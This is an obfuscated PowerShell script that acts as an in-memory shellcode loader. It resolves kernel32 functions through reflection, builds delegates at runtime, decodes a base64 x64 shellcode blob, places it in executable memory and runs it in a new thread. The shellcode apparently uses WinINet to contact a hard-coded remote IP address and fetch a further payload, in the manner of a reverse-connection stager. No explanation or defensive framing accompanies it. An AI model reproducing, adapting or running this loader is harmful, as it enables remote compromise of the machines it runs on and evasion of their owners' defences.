
function yjdLk {
	Param ($rDt, $tF)		
	$dp = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $dp.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($dp.GetMethod('GetModuleHandle')).Invoke($null, @($rDt)))), $tF))
}

function ol {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $fbW,
		[Parameter(Position = 1)] [Type] $rPAbL = [Void]
	)
	
	$eDCeD = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$eDCeD.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $fbW).SetImplementationFlags('Runtime, Managed')
	$eDCeD.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $rPAbL, $fbW).SetImplementationFlags('Runtime, Managed')
	
	return $eDCeD.CreateType()
}

[Byte[]]$hJv = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAAxNDUuMjM5LjQxLjE2NgBaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6JEAAAAvcjdUeHQ3WXBHVG5Wc2RTemo3eGhPUTVnQjg5U0ZEMlhtdk4yNktxZzhPUkpReUVSN3pmbWQzZ3dnNVVDRFhUcGFoWEVUNXhXTVItR01tZnczSkRjbGtaMnQtSVZmQ1hpNFRUVkFzYTNZcnFvblZfRW9pMG4wV3VwNHlYT2RieW5VcnpFVkUtcTMtbmw4OFoASInBU1pBWE0xyVNIuAAyoIQAAAAAUFNTScfC61UuO//VSInGagpfSInxah9aUmiAMwAASYngagRBWUm6dUaehgAAAAD/1UiJ8VNaTTHATTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC663oVgAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWFjDWGoAWUnHwvC1olb/1Q==")
		
$ar = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yjdLk kernel32.dll VirtualAlloc), (ol @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $hJv.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($hJv, 0, $ar, $hJv.length)

$mzn3i = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yjdLk kernel32.dll CreateThread), (ol @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ar,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yjdLk kernel32.dll WaitForSingleObject), (ol @([IntPtr], [Int32]))).Invoke($mzn3i,0xffffffff) | Out-Null
